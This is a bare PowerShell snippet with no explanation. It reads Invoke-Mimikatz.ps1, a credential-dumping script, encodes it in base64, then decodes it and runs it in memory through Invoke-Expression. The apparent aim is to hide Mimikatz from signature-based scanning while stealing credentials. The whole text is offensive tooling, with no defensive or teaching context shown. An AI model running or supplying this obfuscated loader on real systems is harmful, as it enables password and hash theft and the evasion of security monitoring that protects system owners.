$temp = Get-Content .\Invoke-Mimikatz.ps1
$bytes = [System.Text.Encoding]::UTF8.GetBytes($temp)
$encoded = [System.Convert]::ToBase64String($bytes)


[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($encoded)) | iex
